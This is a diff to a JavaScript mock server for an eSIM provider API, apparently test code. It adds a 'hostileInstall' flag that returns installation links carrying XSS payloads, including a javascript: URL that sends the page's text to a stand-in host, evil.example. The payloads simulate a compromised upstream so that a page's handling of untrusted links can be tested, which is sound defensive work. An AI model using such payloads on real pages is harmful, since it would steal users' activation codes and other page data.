@@ -8,7 +8,9 @@
  *     404 for a checkout it no longer knows, and 200 with the ICCID and the installation details
  *     once it is (safe to call repeatedly).
  *   - POST /esim/{iccid}/purchase prices a bundle joining a profile already issued: the same shape
- *     as /esim/purchase, plus an `iccid` echoing which profile it quoted. state.refuseTopup makes
+ *     as /esim/purchase, plus an `iccid` echoing which profile it quoted. state.hostileInstall
+ *     makes every installation detail a link that would run script if the page ever trusted it.
+ *     state.refuseTopup makes
  *     this answer 400 instead — nadanada documents that not every bundle can join every profile —
  *     `true` refuses every top-up purchase, an ICCID string refuses only that profile's, and ''
  *     (the default) refuses none. state.wrongTopupIccid, when set, echoes that ICCID instead of the
@@ -59,7 +61,7 @@ const round2 = (x) => Math.round(x * 100) / 100;
 function start({ mockPayer, catalogue = CATALOGUE } = {}) {
   const state = {
     checkouts: new Map(), seq: 1, tamper: '', settleAfterCalls: 0, expirySeconds: 3600,
-    refuseTopup: '', wrongTopupIccid: '', log: [],
+    refuseTopup: '', wrongTopupIccid: '', hostileInstall: false, log: [],
   };
 
   /** A quote for `bundleName`/`slug`, against `targetIccid` (a top-up) or '' (a fresh eSIM). */
@@ -107,9 +109,13 @@ function start({ mockPayer, catalogue = CATALOGUE } = {}) {
     return { status: 200, body: { success: true, data: {
       iccid: co.iccid, bundleName: co.bundleName, orderReference: 'ORD-' + co.checkoutId.slice(0, 8),
       installationDetails: {
-        qrCode: 'https://nadanada.me/qr/' + co.iccid + '.png', manualCode: ac, smdpAddress: 'rsp.example.com', matchingId: co.iccid.slice(-6),
-        appleInstallUrl: 'https://esimsetup.apple.com/esim_qrcode_provisioning?carddata=' + encodeURIComponent(ac),
-        androidInstallUrl: 'https://esim.example/android?lpa=' + encodeURIComponent(ac),
+        // state.hostileInstall stands in for a nadanada that has been compromised, or whose own
+        // upstream injected a link: everything here is a string we did not write, rendered on the
+        // page that is showing the holder's activation code.
+        qrCode: state.hostileInstall ? 'javascript:fetch("//evil.example/"+document.body.innerText)' : 'https://nadanada.me/qr/' + co.iccid + '.png',
+        manualCode: ac, smdpAddress: 'rsp.example.com', matchingId: co.iccid.slice(-6),
+        appleInstallUrl: state.hostileInstall ? 'javascript:alert(document.domain)' : 'https://esimsetup.apple.com/esim_qrcode_provisioning?carddata=' + encodeURIComponent(ac),
+        androidInstallUrl: state.hostileInstall ? 'data:text/html,<script>alert(1)</script>' : 'https://esim.example/android?lpa=' + encodeURIComponent(ac),
       },
     } } };
   }
